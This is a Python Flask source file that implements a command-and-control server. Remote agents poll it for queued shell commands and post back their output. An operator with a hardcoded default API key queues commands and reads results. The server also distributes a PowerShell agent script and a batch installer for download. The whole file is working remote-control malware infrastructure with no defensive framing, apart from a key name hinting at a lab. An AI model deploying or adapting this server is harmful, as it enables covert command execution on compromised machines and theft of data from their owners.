from flask import Flask, request, jsonify, send_file
import os, io, queue, threading

app = Flask(__name__)
API_KEY = os.environ.get('API_KEY', 'lab-key-felix')
cmd_queue = queue.Queue()
output_store = []

def auth(req):
    return req.headers.get('X-API-Key') == API_KEY or req.args.get('key') == API_KEY

AGENT_PS1 = None  # loaded at startup

@app.route('/ping')
def ping():
    return jsonify({'status': 'online'})

@app.route('/getcmd')
def getcmd():
    try:
        cmd = cmd_queue.get_nowait()
        return jsonify({'cmd': cmd})
    except queue.Empty:
        return jsonify({'cmd': ''})

@app.route('/result', methods=['POST'])
def result():
    data = request.json or {}
    output = data.get('output', '')
    if output:
        output_store.append(output)
        if len(output_store) > 50:
            output_store.pop(0)
    return jsonify({'ok': True})

@app.route('/runcmd', methods=['POST'])
def runcmd():
    if not auth(request):
        return jsonify({'error': 'unauthorized'}), 401
    data = request.json or {}
    cmd = data.get('cmd', '')
    if cmd:
        cmd_queue.put(cmd)
    return jsonify({'ok': True, 'cmd': cmd})

@app.route('/getoutput')
def getoutput():
    if not auth(request):
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'output': output_store[-10:]})

@app.route('/clearoutput', methods=['POST'])
def clearoutput():
    if not auth(request):
        return jsonify({'error': 'unauthorized'}), 401
    output_store.clear()
    return jsonify({'ok': True})

@app.route('/download')
def download():
    global AGENT_PS1
    if AGENT_PS1 is None:
        with open('agent.ps1', 'rb') as f:
            AGENT_PS1 = f.read()
    return send_file(io.BytesIO(AGENT_PS1), download_name='agent.ps1', as_attachment=True)

@app.route('/bat')
def bat():
    with open('setup.bat', 'rb') as f:
        data = f.read()
    return send_file(io.BytesIO(data), download_name='setup.bat', as_attachment=True)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    app.run(host='0.0.0.0', port=port)
